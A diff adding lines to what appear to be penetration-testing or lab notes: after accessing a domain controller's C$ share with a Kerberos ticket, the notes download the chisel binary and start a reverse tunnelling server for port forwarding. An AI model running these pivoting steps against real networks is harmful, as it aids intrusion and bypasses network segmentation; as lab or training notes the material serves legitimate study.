@@ -566,3 +566,12 @@ $ klist
 $ smbclient //dc01/C$ -k -c ls -no-pass
 ```
 %% importing ccache file into our session %%
+
+```
+$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+$ gzip -d chisel_1.7.7_linux_amd64.gz
+$ mv chisel_* chisel && chmod +x ./chisel
+$ sudo ./chisel server --reverse 
+```
+%% set up chisel for port forwarding %%
+
